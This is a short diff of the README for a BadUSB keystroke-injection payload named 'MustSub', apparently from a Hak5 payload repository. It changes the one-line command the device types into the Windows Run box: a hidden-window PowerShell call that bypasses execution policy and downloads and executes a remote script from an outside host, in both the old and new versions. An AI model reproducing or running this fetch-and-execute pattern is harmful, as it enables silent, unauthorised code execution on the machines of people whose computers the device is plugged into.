@@ -45,7 +45,7 @@ each URL will be passed through the subscribe function
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the dependencies and payload
 ```
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-MustSub/MustSub.ps1?dl=1; invoke-expression $pl
+powershell -w h -NoP -NonI -Ep Bypass iwr jakoby.lol/14q | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
